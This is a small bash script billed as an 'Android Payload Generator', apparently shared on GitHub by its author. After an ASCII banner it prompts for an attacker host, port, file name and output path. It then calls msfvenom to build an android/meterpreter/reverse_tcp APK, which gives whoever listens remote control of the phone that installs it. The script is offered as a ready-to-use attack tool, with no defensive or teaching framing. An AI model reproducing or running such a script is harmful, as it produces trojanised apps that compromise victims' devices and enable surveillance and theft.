# Author : Abhay Vishwakarma
# Github : https://github.com/Abhaysoft-inc
# Banner
echo -e "\e[31m                                                              \e[0m";



echo -e "\e[31m    ###    ########   ######   \e[0m";
echo -e "\e[31m   ## ##   ##     ## ##    ##  \e[0m";
echo -e "\e[31m  ##   ##  ##     ## ##        \e[0m";
echo -e "\e[31m ##     ## ########  ##   #### \e[0m";
echo -e "\e[31m ######### ##        ##    ##  \e[0m";
echo -e "\e[31m ##     ## ##        ##    ##  \e[0m";
echo -e "\e[31m ##     ## ##         ######   \e[0m";
echo " "
echo -e "\e[31m Android   Payload    Generator \e[0m"
                              
echo -e "\e[31m                                                              \e[0m";             

echo -e " Author  = github.com/Abhaysoft-inc              "
echo -e "\e[34m Website = http://www.abhaycybersolutions.ml            \e[0m "
echo -e "\e[49m                                 \e[2m"

read -p "[*]Enter lhost#~: " lhost
echo -e "\e[32m[*]LHOST Set To $lhost \e[0m"
read -p "[*]Enter lport#~: " lport
echo -e "\e[32m[*]LPORT Set To $lport \e[0m"
read -p "[*]Enter Payload name#~: " payload
echo -e "\e[32m[*]Payload Name Set To $payload \e[0m"
read -p "[*]Enter Output Path#~: " path
echo -e "\e[32m[*]Output Path Set To $path \e[0m"
echo -e "\e[31m[*]Payload Generation Started...\e[0m"

echo $path/$payload.apk

msfvenom -p android/meterpreter/reverse_tcp lhost=$lhost lport=$lport R> $path/$payload.apk
echo " "
echo -e "\e[35m[*]Payload Successfully Generated at $path \e[0m" 
echo "  "
echo -e "\e[35m[*]Thanks For Using Our Tool  \e[0m"
echo " "
exit
#Changing this banner doesn't make you programmer..!"
